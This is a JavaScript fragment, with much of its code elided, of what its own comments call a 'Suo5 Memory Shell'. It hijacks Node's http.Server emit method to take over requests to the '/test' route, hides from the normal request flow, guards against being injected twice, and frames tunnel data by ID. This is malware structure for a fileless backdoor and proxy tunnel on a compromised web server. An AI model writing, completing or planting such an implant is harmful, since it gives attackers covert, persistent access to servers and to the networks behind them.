(async function () {
    ...
    if (!http.Server.prototype.__suo5_patched) {
        ...
        http.Server.prototype.emit = function (type, req, res) {
            ...
            if (type === 'request' && req && req.url) {
                ...
                if (pathname === '/test') {
                    ...
                    // 拦截成功，返回 true，阻止事件继续向下传递（防止原框架报 404 等冲突）
                    return true;
                }
            }
            // 非命中路由，透明放行给原始逻辑
        ...
        // 标记已注入，防止多次执行 payload 导致无限嵌套/内存泄漏
        http.Server.prototype.__suo5_patched = true;
        // console.log("Suo5 Memory Shell successfully registered at route: /test");
    }
    ...
    function newData(tunId, data) {
        ...
        m.set("dt", Buffer.from(data || Buffer.alloc(0)));
        m.set("id", Buffer.from(tunId));
        return m;
    }
